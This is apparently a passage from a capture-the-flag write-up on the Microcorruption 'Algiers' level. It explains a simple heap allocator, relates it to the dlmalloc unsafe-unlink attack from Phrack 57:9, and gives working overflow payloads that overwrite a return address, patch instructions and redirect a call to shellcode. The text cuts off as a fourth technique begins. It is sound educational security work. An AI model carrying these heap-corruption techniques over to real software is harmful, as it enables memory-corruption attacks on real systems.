│ └─┤  2408  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The top block is likely some variety of header. The first word points to the beginning of the list. It is unclear what the second one does. Next, there is user data.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ <mark>aaaa 0000 0000 0000 ....</mark> │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ <mark>bbbb 0000 0000 0000 ....</mark> │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ <mark>0000 0000 0000 0000 ....</mark> │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>Although not depicted here for conciseness, these buffers are sixteen bytes long. Last, there is the third word.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  <mark>0021</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  <mark>0021</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  <mark>1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>These words, modified repeatedly by the algorithm, are the most enigmatic part of the data structure. The least significant bit of each must be a boolean because it determines the outcome of both conditional statements in the <code>free</code> function.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  002<mark>1</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  002<mark>1</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9<mark>c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>This boolean is unset via a bitwise <code>AND</code> operation, suggesting that the rest of the word might be a series of flags that alter the algorithm's behavior. However, this assumption is unlikely to be true in practice, as none of the other bits in the word seem to be referenced by the code.</p>

<p>The other possibility is that this word is a size of some kind. The fact that the code adds the third word for the current and neighboring blocks together supports this hypothesis. It also adds six to this field in the conditional blocks at addresses <code>0x4524</code> and <code>0x454a</code>, the same length as the three-word header for every node in the linked list.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────┐
    │  2408  │  1000  │  0000  │ 0000 │
    └────┬───┴────────┴────────┴──────┘
         │
┌──────┐ │
│      │ │
│ ┌──┐ │ │
│ │  ▼ ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408  │  241e  │  0021</mark>  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408  │  2434  │  0021</mark>  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>241e  │  2408  │  1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>This theory is not entirely sensible because any given block is 22 bytes long (six bytes for the header and sixteen bytes for the data buffer). This value is 0x16 in hex, but the value in the third word is 0x20 (sans boolean bit).</p>

<p>This field could also be both a size <em>and</em> a series of flags.</p>

<h2>Revisiting Phrack 57:9</h2>

<p>Take a step back for a moment and consider the surrounding context. While treating the algorithm as alien is acceptable as a pedagogical tool, this is not the most efficient approach. This system has debug symbols, so performing an internet search with the function names as keywords will answer a question hitherto unaddressed: what do <code>malloc</code> and <code>free</code> <em>do</em>?</p>

<h4>What Is The Heap?</h4>

<p>It is often necessary to allocate space for quantities of data that are not known at compile time (e.g., user input). The stack generally cannot store this data because the space available for stack variables is defined at compile time, i.e., before the code reads user input.</p>

<p>Two approaches might potentially compensate for this.</p>

<ol>
	<li>Use massive stack variables to store data that is potentially very large but usually is not. This approach is inefficient in the extreme from a memory usage standpoint.</li>
	<li>Designate some other area in memory where dynamically sized data is stored and refer to the data via pointers.</li>
</ol>


<p>The second area is called the heap. Envision it as a pile of whatever large or unpredictably sized data will not fit into the stack. Fundamentally, the heap is just a chunk of RAM used to store chunks of data. Sections are designated to hold new data as necessary, and sections holding disused data are emptied and freed up. The process of slicing and dicing this memory is called dynamic memory management.</p>

<h4>Dynamic Memory Management Functions</h4>

<p>Two primary functions keep track of the data stored on the heap.</p>

<ol>
	<li><b>Malloc.</b> The process of carving out sections or "chunks" to hold new data is called allocation. The <em>malloc</em> function ("<em>m</em>emory <em>alloc</em>ator") is responsible for this task. It sections off a heap buffer of the requested length and returns a pointer to it, allowing other functions to use that memory for storing data.</li>


	<li><b>Free.</b> When some parent function finishes with the data in a heap chunk, it passes the pointer to the <em>free</em> function, which clears out the data so the chunk can store something else.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	For performance reasons, it is often preferable to postpone clearing the data until later. It is more efficient to set a flag indicating that the chunk is free and that it is safe to overwrite the data.
</span></li>
</ol>

<p>The algorithm described above is a simple implementation of a free function that most closely resembles the GLIBC Doug Lea malloc implementation circa 2001—one of the two implementations described by Phrack 57:9.</p>

<h4>Terminology</h4>

<p>The sections of memory that have been referred to as "blocks" up to this point are also called "chunks". The original dlmalloc implementation had the following structure for a freed chunk.</p>

<pre><code class='language-ascii-noshadows'><xmp>             +----------------------------------+
    chunk -> | prev_size                        |
             +----------------------------------+
             | size                             |
             +----------------------------------+
      mem -> | fd                               |
             +----------------------------------+
             | bk                               |
             +----------------------------------+
             | (old memory, can be zero bytes)  |
             :                                  :

nextchunk -> | prev_size ...                    |
             :                                  :
</xmp></code></pre>


<blockquote>
[T]wo values, called 'fd' and 'bk'—forward and backward, that is, are pointers. They point into a double linked list of unconsolidated blocks of free memory. Every time a new free is issued, the list will be checked, and possibly unconsolidated blocks are merged.
<br>
<cite>— Phrack 57:9</cite>
</blockquote>

<p>Based on this, the Algiers implementation probably has the following structure.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────────────────────────┐
    │BACK    │FORWARD │  SIZE  │           DATA           │
    │POINTER │POINTER │        │                          │
    └────────┴────────┴────────┴──────────────────────────┘

┌──────┐
│      │
│ ┌──┐ │
│ │  ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The first two words form a series of pointers resembling <code>fd</code> and <code>bk</code>, and the data buffer is distinctly visible. By process of elimination, the third word must be the size field.</p>

<blockquote>
The 'size' field has a special meaning. As you would expect, it contains the length of the current block of memory, the data section. As you call malloc(), four is added to the size you pass to it and afterwards the size is padded up to the next double-word boundary. So a malloc(7) will become a malloc(16), and a malloc(20) will become malloc(32). For malloc(0) it will be padded to malloc(8). [...] Since this padding implies that the lower three bits are always zero and are not used for real length, they are used another way. They are used to indicate special attributes of the chunk. The lowest bit, called PREV_INUSE, indicates whether the previous chunk is used or not. [...] To test whether the current chunk is in use or not, we have to check the next chunk's PREV_INUSE bit within its size value.

<br>
<cite>— Phrack 57:9</cite>
</blockquote>

<p>Logically, the least significant bit of the <code>size</code> is likely an "in-use bit". In this case, it is unclear how the size padding works during allocation, but that is not immediately relevant. On the Algiers implementation, this bit tracks whether the current chunk is in use (rather than the previous one).</p>

<h4>The Wilderness</h4>

<p>The chunk at the bottom is called the "wilderness chunk," a large block of free memory that <code>malloc</code> allocates from when all else fails. This purpose is evident from the massive <code>size</code> field without the in-use bit set.</p>

<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────────────────────────┐
    │BACK    │FORWARD │  SIZE  │           DATA           │
    │POINTER │POINTER │        │                          │
    └────────┴────────┴────────┴──────────────────────────┘

┌──────┐
│      │
│ ┌──┐ │
│ │  ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  2434  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  <mark>1f9c</mark>  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
└──────────────────┘
</code></pre>

<p>The double-linked list structure is necessary because the algorithm traverses it when searching for free chunks large enough to hold the requested buffer size. If the search for a sufficiently large free chunk fails, <code>malloc</code> will carve one off from the wilderness. This functionality works the same on both the Algiers implementation and GLIBC.</p>

<h4>Exploitation</h4>

<p>There are other crucial differences between the two implementations. In Algiers, the <code>fd</code> and <code>bk</code> pointers are always present (whereas GLIBC requires the overflowed chunk to be unallocated for the exploit to work). The pointers are before the <code>size</code>, and there is no <code>prev_size</code> field on the Algiers implementation. These superficial differences aside, the technique is very similar.</p>

<p>In essence, the exploit abuses chunk consolidation logic. The algorithm merges adjacent free chunks to fit larger allocations inside, which requires adding the <code>size</code> fields together and updating the pointers for the previous and next chunks in memory so they point to the beginning of the consolidated chunk.</p>

<p>Consider a case where the first two chunks merge into one larger one.</p>

<br>
<div id="slides">
  <section id="data-structure-pointers-prior-labeled">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────────────────────────┐
    │BACK    │FORWARD │  SIZE  │           DATA           │
    │POINTER │POINTER │        │                          │
    └────────┴────────┴────────┴──────────────────────────┘

┌──────┐
│      │
│ ┌──┐ │
│ │  ▼ ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  2408  │  241e  │  0021  │ aaaa 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  <mark>2434</mark>  │  0021  │ bbbb 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│      ▲           │
│ ┌────┘           │
│ │                │
│ │    ┌───────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │
└──────────────────┘
</code></pre>
  </section>
  <section id="data-structure-pointers-full-labeled">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────────────────────────┐
    │BACK    │FORWARD │  SIZE  │           DATA           │
    │POINTER │POINTER │        │                          │
    └────────┴────────┴────────┴──────────────────────────┘

┌──────┐
│      │
│ ┌──┐ │           ┌────────────────────────────────────────┐
│ │  ▼ ▼           │                                        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  <mark>2434</mark>  │  0046  │ aaaa 0000 0000 0000 .... │ │
│   └────────┴────────┴────────┴──────────────────────────┘ │
│      ▲                                                    │
│ ┌────┘                                                    │
│ │                                                         │
│ │                                                         │
│ │                                                         │
│ │ ┌────────┬────────┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  2434  │  0020  │ bbbb 0000 0000 0000 .... │ │
│   └────────┴─────┬──┴────────┴──────────────────────────┘ │
│                  │                                        │
│                  ▼                                        │
│                  │                                        │
│      ┌───────────┴────────────────────────────────────────┘
│      ▼
│   ┌────────┬────────┬────────┬──────────────────────────┐
├─◄─┤  <mark>2408</mark>  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │
└─◄────────────────┘
</code></pre>
  </section>
  <section id="data-structure-pointers-condensed-labeled">
<pre><code class='language-ascii-noshadows'>    ┌────────┬────────┬────────┬──────────────────────────┐
    │BACK    │FORWARD │  SIZE  │           DATA           │
    │POINTER │POINTER │        │                          │
    └────────┴────────┴────────┴──────────────────────────┘

┌──────┐
│      │
│ ┌──┐ │           ┌────────────────────────────────────────┐
│ │  ▼ ▼           │                                        │
│ │ ┌────────┬─────┴──┬────────┬──────────────────────────┐ │
│ └─┤  2408  │  <mark>2434</mark>  │  0046  │ aaaa 0000 0000 0000 .... │ │
│   └────────┴────────┴────────┴──────────────────────────┘ │
│      ▲                                                    │
│ ┌────┘                                                    │
│ │                                                         │
│ │    ┌────────────────────────────────────────────────────┘
│ │    ▼
│ │ ┌────────┬────────┬────────┬──────────────────────────┐
│ └─┤  <mark>2408</mark>  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │
│   └────────┴─────┬──┴────────┴──────────────────────────┘
│                  │
│                  │
└──────────────────┘








</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#data-structure-pointers-prior-labeled">Before Free</a></li>
  <li><a href="#data-structure-pointers-full-labeled">After Free</a></li>
  <li><a href="#data-structure-pointers-condensed-labeled">Malloc's View Of Double-Linked List</a></li>
</ul>

<p>In reality, there is also a second merge because the bottom chunk is also free. The diagram depicts only the first merge for brevity.</p>

<p>If the exploit aims the <code>fd</code> and <code>bk</code> pointers at random memory regions, the implementation will treat those memory regions as chunks and check what it assumes is the in-use bit. If this value happens to be even in either case, it will attempt to merge with one or both of those presumed chunks. After the merge, this will update the <code>fd</code> pointer for what it assumes is the previous chunk and the <code>bk</code> pointer for what it assumes is the next chunk.</p>

<pre><code class='language-ascii-noshadows'>   ┌────────┬────────┬────────┬──────────────────────────┐
   │BACK    │FORWARD │  SIZE  │           DATA           │
   │POINTER │POINTER │        │                          │
   └────────┴────────┴────────┴──────────────────────────┘

   ┌────────┬────────┬────────┬──────────────────────────┐
   │  <mark>cccc</mark>  │  <mark>eeee</mark>  │  0021  │ bbbb 0000 0000 0000 .... │
   └─────┬──┴─────┬──┴────────┴──────────────────────────┘
      ▲  │        │
 ┌────┘  │        │
 │       │        └─────────────────────────────────────────────┐
 │       │                                                      │
 │       └───────────────────────────────────────────────────┐  │
 │                                                           │  │
 │ ┌────────┬────────┬────────┬──────────────────────────┐   │  │
 └─┤  241e  │  2408  │  1f9c  │ 0000 0000 0000 0000 .... │   │  │
   └────────┴────────┴────────┴──────────────────────────┘   │  │
                                                             │  │
                                                             │  │
                                                             │  │
                 ┌───────────────────────────────────────────┘  │
                 │                                              │
                 │                                              │
                 │                                              │
                 │                                              │
                 ▼                                              │
   ┌────────┬────────┬────────┬────────┬────────┐               │
   │DATA    │  0000  │  <mark>eeee</mark>  │  002c  │  ....  │               │
   ├────────┼────────┼────────┼────────┼────────┤               │
   │ADDRESS │ 0xcccc │ 0xccce │ 0xccd0 │  ....  │               │
   └────────┴────────┴────────┴────────┴────────┘               │
                                                                │
                 ┌──────────────────────────────────────────────┘
                 ▼
   ┌────────┬────────┬────────┬────────┬────────┐
   │DATA    │  <mark>cccc</mark>  │  0000  │  0000  │  ....  │
   ├────────┼────────┼────────┼────────┼────────┤
   │ADDRESS │ 0xeeee │ 0xeef0 │ 0xeef2 │  ....  │
   └────────┴────────┴────────┴────────┴────────┘
</code></pre>

<p>The attempted merge forward is what the arbitrary write primitive abuses. It will merge with arbitrary data, writing the back pointer to what it assumes is a chunk header.</p>

<h2>Recapitulation</h2>

<p>Now that terminology has been established, it is time to return to the techniques.</p>

<h3>Technique #1: Arbitrary Write Via Consecutive Heap Overflows</h3>

<p>The below payload is the initial working exploit, which uses two different buffer overflows to corrupt a return address.</p>

<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>9243</mark> 3424 2100</code></pre>

<h5>Password</h5>
<pre><code>bbbb bbbb bbbb bbbb bbbb bbbb bbbb bbbb 1e24 <mark>6445</mark> 9c1f</code></pre>

<p>This technique requires corrupting <code>fd</code> and <code>bk</code> for the next chunk—before the implementation frees it—and the same pointers for the chunk right after it in memory.</p> 

<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
┌─┤  <mark>4392</mark>  │  ....  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │
│                │
│                │
│    ┌───────────┘
│    │
│    │
│    ▼
│ ┌────────┬────────┬────────┬──────────────────────────┐
│ │  ....  │  <mark>4564</mark>  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │WRITE
│                └─────┐
│                      │
│                      │
│                      │
│                      │
└─────────────┐        │
              │        │
              │        │
       POINTER▼        ▼
  ┌────────┬────────┬────────┬────────┐
  │DATA    │  ....  │  46a8  │  ....  │
  ├────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x4392 │ 0x4394 │  ....  │
  └────────┴────────┴────────┴────────┘
</code></pre>

<h3>Technique #2: Doug Lea Malloc Unsafe Unlink Exploit</h3>

<p>This technique only requires a six-byte overflow on the Algiers heap implementation.</p>

<h5>Username</h5>
<pre><code>023c aaaa aaaa 3240 00ff b012 1000 aaaa <mark>0e24 9443</mark> 2100</pre></code>

<h5>Password</h5>
<pre><code>ffff</pre></code>


<p>This payload overwrites the return address for the current stack frame with a pointer to the shellcode at address <code>0x240e</code>.

<pre><code class='language-ascii-noshadows'>  ┌────────┬────────┬────────┬──────────────────────────┐
┌─┤  <mark>240e  │  4394</mark>  │  ....  │ .... .... .... .... .... │
│ └────────┴─────┬──┴────────┴──────────────────────────┘
│                │POINTER
│                └───────┐
│                        │
│                        │
│                        │
│                        │
└──────────────────────┐ │
                       │ │
                       │ │
                  WRITE▼ ▼
  ┌────────┬────────┬────────┬────────┐
  │DATA    │  ....  │  46a8  │  ....  │
  ├────────┼────────┼────────┼────────┤
  │ADDRESS │ 0x4392 │ 0x4394 │  ....  │
  └────────┴────────┴────────┴────────┘
</code></pre>

<p>This exploit requires some shellcode to work, depicted below.</p>

<pre><code class='language-ascii-noshadows'>  ┌───────────────────┬─────────────────────┐
┌─┤     JMP $+0x6     │ 023c                │
│ ├───────────────────┼─────────────────────┤
│ │[OVERWRITTEN WORDS]│ aaaa aaaa           │
│ ├───────────────────┼─────────────────────┤
│ │                   │                     │
└►│     SHELLCODE     │ 3240 00ff b012 1000 │
  │                   │                     │
  ├───────────────────┼─────────────────────┤
  │     PADDING       │ aaaa                │
  ├───────────────────┼─────────────────────┤
  │                   │                     │
  │     METADATA      │ 0e24 9443 2100      │
  │                   │                     │
  └───────────────────┴─────────────────────┘
</code></pre>

<p>Minor implementation differences aside, this is the equivalent of the original dlmalloc unlink exploit described in Phrack 57:9.</p>


<h2>Beyond Phrack</h2>

<p>The process described up to this point is how to discover a twenty-five-year-old heap exploitation technique without understanding the purpose of a heap. This approach is pedagogically worthwhile, but some might argue that acquiring a superficial understanding via video tutorials is faster.</p>

<p>That is an inferior mindset. A superficial understanding of the technique is acceptable only when the objective is to compromise a specific system. The goal is to understand how to reverse engineer and abuse any heap implementation—not just this one. Some may object that this weapons test is an academic exercise. There are two possible responses: walk away or dump the magazine.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>

<input type="checkbox" id="sn-1" class="sidenote-toggle" />
<span class="sidenote">
	Whichever is chosen amounts to the same: absolutely nothing. <a href="https://www.youtube.com/watch?v=RFIwEQkH7sg">Cue the music</a>.
</span></p>

<p>It is time to put this philosophy to the test—by using it to do something slightly more original.</p>

<h3>Technique #3: Corrupting Instruction Memory</h3>
<h4>Patching In Unconditional Jumps</h4>

<p>This processor does not have DEP (Data Execution Prevention), so nothing prevents the use of this exploit to patch jumps into the middle of functions during execution. Consider the end of the login function, for example.</p>

<pre><code class='language-ascii-noshadows'>4690:  b012 6445      call	#0x4564 &lt;unlock_door&gt;
4694:  3f40 0b46      mov	#0x460b, r15
4698:  023c           jmp	$+0x6 &lt;login+0x64&gt;
469a:  3f40 1b46      mov	#0x461b, r15
469e:  b012 1a47      call	#0x471a &lt;puts&gt;
46a2:  0f4b           mov	r11, r15
46a4:  b012 0845      call	#0x4508 &lt;free&gt;
46a8:  0f4a           mov	r10, r15
46aa:  b012 0845      call	#0x4508 &lt;free&gt;
46ae:  3a41           pop	r10
46b0:  3b41           pop	r11
<mark>46b2:  3041           ret</mark>
</code></pre>

<p>Instead of overwriting a return address, use the arbitrary write primitive to write a jump opcode over the <code>RET</code> instruction at address <code>0x46b2</code>. This exploit will redirect execution to the <code>unlock_door</code> call at address <code>0x4690</code>.</p>

<pre><code class='language-ascii-noshadows'>┌─►<mark>4690:  b012 6445      call	#0x4564 &lt;unlock_door&gt;</mark>
│  4694:  3f40 0b46      mov	#0x460b, r15
│  4698:  023c           jmp	$+0x6 &lt;login+0x64&gt;
│  469a:  3f40 1b46      mov	#0x461b, r15
│  469e:  b012 1a47      call	#0x471a &lt;puts&gt;
│  46a2:  0f4b           mov	r11, r15
│  46a4:  b012 0845      call	#0x4508 &lt;free&gt;
│  46a8:  0f4a           mov	r10, r15
│  46aa:  b012 0845      call	#0x4508 &lt;free&gt;
│  46ae:  3a41           pop	r10
│  46b0:  3b41           pop	r11
└──<mark>46b2:  ee3f           jmp	$-0x22</mark>
</code></pre>

<p>The only constraint is that the opcode written must be even if interpreted as a little-endian integer. The <code>JMP $-0x22</code> instruction satisfies this constraint. This variation eliminates the need to inject shellcode. The resulting payload is significantly less complex.</p>

<h4>Final Exploit</h4>
<h5>Username</h5>
<pre><code>aaaa aaaa aaaa aaaa aaaa aaaa aaaa aaaa <mark>ee3f b246</mark> 2100</pre></code>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7371 cycles.
</code></pre>

<p>This exploit again achieves success. It is worth noting what happens near address <code>0x3fee</code> for completeness.</p>

<pre><code>3ff0: <mark>3041 4a41</mark> 0000 0000 0000 0000 0000 0000   0AJA............
4000: 0000 0000 0000 0000 0000 0000 0000 0000   ................
</code></pre>

<p>This address contains the useless data otherwise written into the second and third words of the shellcode. This exploit works as long as the instruction to write does not assemble to bytes that are also a valid address containing critical code or data.</p>

<h4>Partially Overwriting Branch Instructions</h4>

<p>Patching in a <code>JMP</code> instruction works well when the execution can redirect to a nearby location, but there is a maximum range for relative jumps. Instructions like <code>CALL</code> and <code>BR</code> require two words to represent, so it is impossible to patch them in with a single-word arbitrary write. However, nothing prevents the target address of an existing <code>CALL</code> from being changed to something else.</p>

<p>Consider the structure for the following sample instructions.</p>

<br>
<table>
	<caption>Format for <code>CALL</code> and <code>BR</code> Instructions.</caption>
        <thead>
          <tr>
            <th>Example Opcode</th>
            <th>Disassembly</th>
          </tr>
        </thead>
        <tbody>
          <tr>
		  <td><code>b012 <mark>0845</mark></code></td>
                  <td><code>call #0x4508 &lt;free&gt;</code></td>
          </tr>
          <tr>
		  <td><code>3040 <mark>4044</mark></code></td>
                  <td><code>br #0x4440 &lt;__stop_progExec__&gt;</code></td>
          </tr>
        </tbody>
	</table>

	<p>It should generally be possible to overwrite the second word of these instruction types to change the target address and redirect the execution flow. The second <code>free</code> call is a prime candidate.</p>

<pre><code>4690:  b012 6445      call	#0x4564 &lt;unlock_door&gt;
4694:  3f40 0b46      mov	#0x460b, r15
4698:  023c           jmp	$+0x6 &lt;login+0x64&gt;
469a:  3f40 1b46      mov	#0x461b, r15
469e:  b012 1a47      call	#0x471a &lt;puts&gt;
46a2:  0f4b           mov	r11, r15
46a4:  b012 0845      call	#0x4508 &lt;free&gt;
46a8:  0f4a           mov	r10, r15
46aa:  b012 <mark>0845</mark>      call	#0x4508 &lt;free&gt;
46ae:  3a41           pop	r10
46b0:  3b41           pop	r11
46b2:  3041           ret
</code></pre>

<p>In this case, the exploit replaces the address for the second <code>free</code> call with a pointer to the shellcode.</p>

<br>
<div id="slides">
  <section id="technique-3-before-free">
<pre><code class='language-ascii-noshadows'>   ┌────────┬────────┬────────┬──────────────────────────┐
 ┌─┤  240e  │  46ac  │  ....  │ .... .... .... .... .... │
 │ └────────┴─────┬──┴────────┴──────────────────────────┘
 │                │POINTER
 │                └───────┐
 │                        │
 │                        │
 │                        │
 │                        │
 └──────────────────────┐ │
                        │ │
                        │ │
                   WRITE▼ ▼
┌───────────┬────────┬─────────────┬────────┐
│DATA       │  12b0  │    <mark>4508</mark>     │  ....  │
├───────────┼────────┼─────────────┼────────┤
│INSTRUCTION│  CALL  │   <mark>&lt;free&gt;</mark>    │  ....  │
├───────────┼────────┼─────────────┼────────┤
│ADDRESS    │ 0x46aa │   0x46ac    │  ....  │
└───────────┴────────┴─────────────┴────────┘
</code></pre>
  </section>
  <section id="technique-3-after-free">
<pre><code class='language-ascii-noshadows'>   ┌────────┬────────┬────────┬──────────────────────────┐
 ┌─┤  240e  │  46ac  │  ....  │ .... .... .... .... .... │
 │ └────────┴─────┬──┴────────┴──────────────────────────┘
 │                │POINTER
 │                └───────┐
 │                        │
 │                        │
 │                        │
 │                        │
 └──────────────────────┐ │
                        │ │
                        │ │
                   WRITE▼ ▼
┌───────────┬────────┬─────────────┬────────┐
│DATA       │  12b0  │    <mark>240e</mark>     │  ....  │
├───────────┼────────┼─────────────┼────────┤
│INSTRUCTION│  CALL  │ <mark>&lt;SHELLCODE&gt;</mark> │  ....  │
├───────────┼────────┼─────────────┼────────┤
│ADDRESS    │ 0x46aa │   0x46ac    │  ....  │
└───────────┴────────┴─────────────┴────────┘
</code></pre>
  </section>
</div>
<ul id="nav">
  <li><a href="#technique-3-before-free">Before Free</a></li>
  <li><a href="#technique-3-after-free">After Free</a></li>
</ul>



<p>The payload to achieve this is as follows.</p>

<h4>Final Exploit</h4>
<h5>Username</h5>
<pre><code>023c aaaa aaaa 3240 00ff b012 1000 aaaa <mark>0e24 ac46</mark> 2100</pre></code>

<h5>Password</h5>
<pre><code>bbbb</code></pre>

<h5>Result</h5>
<pre><code>If you were not connected to the debug lock, the door would now be open.
Try running "solve" in the debug console to see if this solution works without the debugger attached.

The CPU completed in 7258 cycles.
</code></pre>

<h3 id="technique-4">Technique #4: Leakless Heap Exploitation Using Size Field Arithmetic</h3>

<p>Corrupting words using the size field as the value to write is also possible. The algorithm adds the overflowed size field to <code>*(bk + 4)</code>.</p>

<p>Observe the behavior with the following payload.</p>

